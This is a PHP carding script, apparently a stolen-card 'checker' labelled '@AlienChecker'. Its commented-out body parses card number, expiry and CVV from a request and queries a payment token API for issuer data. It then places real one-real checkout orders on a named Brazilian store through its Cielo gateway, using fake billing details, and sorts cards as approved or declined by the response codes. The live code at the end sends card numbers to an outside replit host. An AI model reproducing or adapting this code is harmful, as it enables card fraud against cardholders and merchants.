<?php 
// 
// error_reporting(0);
// sleep(2);
// 
// function multiexplode($delimiters, $string)
// {
// 
//     $ready = str_replace($delimiters, $delimiters[0], $string);
//     $launch = explode($delimiters[0], $ready);
//     return $launch;
// }
// function getStr($string, $start, $end)
// {
//     $str = explode($start, $string);
//     $str = explode($end, $str[1]);
//     return $str[0];
// }
// 
// 
// $lista = $_GET['lista'];
// $explode = multiexplode(array('|',':','/',), $lista);
// 
// $cc = $explode[0];
// $mes = $explode[1];
// $ano = $explode[2];
// $cvv = $explode[3];
// 
// $compareano = 2023;
// 
// if (strlen($cc) !== 16 || strlen($mes) !== 2 || strlen($ano) !== 4) {
//     echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Cartao Invalido] => [@AlienChecker]';
//     return;
// }
// if (!is_numeric($cc) || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
//     echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Pare De Tacar Letras No Checker Porfavor!] => [@AlienChecker]';
//     return;
// }
// if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
//     echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Cartao Invalido] => [@AlienChecker]';
//     return;
// }
// if ($ano < $compareano) {
//     echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '] => [Ano Do Cartao E Invalido] => [@AlienChecker]';
//     return;
// }
// 
// if(file_exists('dudu.txt')){
//     unlink('dudu.txt');
// }
// 
// $bin = substr($cc, 0,6);
// $lestbin = substr($cc, 12,16);
// 
// $headers = array(
//     'accept: application/json, text/javascript, */*; q=0.01',
//     'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
//     'referer: https://www.dudu.com.br/produto/lapis-preto-redondo-n2-com-borracha-soho-tilibra-344362',
//     'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54',
//     'x-requested-with: XMLHttpRequest',
// );
// 
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, "https://api.checkout.com/tokens");
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt(
//     $ch,
//     CURLOPT_HTTPHEADER,
//     array(
//         'accept: */*',
//         'authorization: pk_wf64cebluwwe46fsf7fgb3l5umk',
//         'content-type: application/json',
//         'origin: https://js.checkout.com',
//         'referer: https://js.checkout.com/',
//         'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0'
//     )
// );
// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"card","number":"' . $cc . '","expiry_month":11,"expiry_year":2028,"cvv":"483","name":"Limo Soul","billing_address":{"address_line1":"Limoeiro Delasy","city":"Paris","state":"IDF","zip":"75011","country":"FR"},"phone":{"number":"5519996831732"},"preferred_scheme":"","requestSource":"JS"}');
// $puxarbins = curl_exec($ch);
// $pais = getStr($puxarbins, '"issuer_country":"', '",');
// $bandeira = getStr($puxarbins, '"scheme":"', '",');
// $tipo = getStr($puxarbins, '"card_type":"', '",');
// $nivel = getStr($puxarbins, '"product_type":"', '"');
// $banco = getStr($puxarbins, '"issuer":"', '",');
// $INFO = "$bandeira $banco $tipo $nivel ($pais)";
// 
// 
//   $post  = array(
//     'wc_bookings_field_persons_902' => '1',
//     'wc_bookings_field_start_date_day' => '28',
//     'wc_bookings_field_start_date_month' => '12',
//     'wc_bookings_field_start_date_year' => '2023',
//     'add-to-cart' => '864'
// );
// 
// //
// 
//   
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://loja.jmitransportes.com.br/produtos/viagenspersonalizadas/');
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
// 
// $setCookie = curl_exec($ch);
// 
// 
// 
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://loja.jmitransportes.com.br/finalizar-compra/');
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// $checkout = curl_exec($ch);
// 
// $nonce = getStr($checkout, 'checkout-nonce" value="', '"');
// 
// $data = "billing_email=duducomexota%40gmail.com&account_password=&billing_same_as_shipping=0&billing_same_as_shipping_previous=0&billing_first_name=Dayrlon+l&billing_last_name=Ghff&billing_country=BR&billing_postcode=02860-001&billing_address_1=Avenida+Deputado+Cant%C3%ADdio+Sampaio&billing_number=1&billing_address_2=&billing_neighborhood=&billing_city=S%C3%A3o+Paulo&billing_state=SP&billing_phone=(98)+99246-0900&billing_cellphone=&billing_cpf=951.242.528-98&order_comments=&coupon_code=&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Btotal%5D=1.00&cielo_webservice%5Bbandeira%5D=mastercard&cielo_webservice%5Bhash%5D=f429c78f3e78fe7c01dba6950b79c688&cielo_webservice%5Btime%5D=1693785361&cielo_webservice%5Btitular%5D=dudu+lindu&cielo_webservice%5Bfiscal%5D=&cielo_webservice%5Bnumero%5D=$cc&cielo_webservice%5Bvalidade_mes%5D=$mes&cielo_webservice%5Bvalidade_ano%5D=$ano&cielo_webservice%5Bcvv%5D=$cvv&cielo_webservice%5Bparcela%5D=MXwxfDEuMDB8YldGemRHVnlZMkZ5WkE9PXxNUzR3TUE9PXwzNGM0ZDhlODZlYWNkZDA5ZDNmMTg1YjkwOGMyNjI0Yw%3D%3D&cielo_webservice_debito%5Btotal%5D=1.00&cielo_webservice_debito%5Bbandeira%5D=&cielo_webservice_debito%5Btitular%5D=&cielo_webservice_debito%5Bfiscal%5D=&cielo_webservice_debito%5Bnumero%5D=&cielo_webservice_debito%5Bvalidade_mes%5D=&cielo_webservice_debito%5Bvalidade_ano%5D=&cielo_webservice_debito%5Bcvv%5D=&cielo_webservice_debito%5Bparcela%5D=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26elementor_page_id%3D13";
// 
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://loja.jmitransportes.com.br/?wc-ajax=checkout&elementor_page_id=13');
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
// $payment = curl_exec($ch);
// $link = getStr($payment, '"redirect":"', '"');
// 
// 
// if(!$link) {
//   echo $payment;
//   echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $cc|$mes|$ano|$cvv » $INFO » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Erro Interno ]</span> » @dudu";
//   return;
// }
// $link = str_replace('\\', '', $link);
// 
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, $link);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// $result = curl_exec($ch);
// 
// $resultLr = getStr($result,'<b>LR:</b>', '<br' );
// $realResult = $resultLr;
// $threeCarcteresOfResult = substr($resultLr, 0, 5);
// echo $threeCarcteresOfResult;
// 
// if (stripos($threeCarcteresOfResult, '51') !== false) {
//     $resultLr = '51 - Saldo insuficiente';
// }
// if (stripos($threeCarcteresOfResult, '78') !== false) {
//     $resultLr = '78 - Cartao bloqueado';
// }
// if (stripos($threeCarcteresOfResult, '82') !== false) {
//     $resultLr = '82 - Cartao invalido';
// }
// if (stripos($threeCarcteresOfResult, '60') !== false) {
//     $resultLr = '60 - Cartao recusado, entre em contato com o banco';
// }
// if (stripos($threeCarcteresOfResult, '08') !== false) {
//     $resultLr = '08 - Codigo de seguranca invalido';
// }
// 
// //|| stripos($resultLr, '51') || stripos($resultLr, '78') || stripos($resultLr, '82') || stripos($resultLr, '08')|| stripos($resultLr, '60')
// if (stripos($threeCarcteresOfResult, '00')|| stripos($threeCarcteresOfResult, '51') || stripos($threeCarcteresOfResult, '51') || stripos($threeCarcteresOfResult, '78') || stripos($threeCarcteresOfResult, '82') || stripos($threeCarcteresOfResult, '08')|| stripos($threeCarcteresOfResult, '60')) {
//    
//     echo "<br><font color='white'><span style='background: #50c943;color: white;' class='badge bg-gold'>🎁 @ Aprovada</span> » $cc|$mes|$ano|$cvv » $INFO  » <span style='background: #50c943;color: white;' class='badge bg-gold'>[ $resultLr ]</span> » @dudu";
//     
//  } elseif (stripos($realResult, "Autorizacao negada")) {
//     echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $cc|$mes|$ano|$cvv » $INFO » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ $resultLr ]</span> » @dudu";
// } else {
//    echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $cc|$mes|$ano|$cvv » $INFO » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Erro Interno $resultLr]</span> » @dudu";
//  }
// 


$cc = $_GET['cc'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api-gatesjs.noopdev.repl.co/?cc='.$cc.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

$result = curl_exec($ch);
echo $result;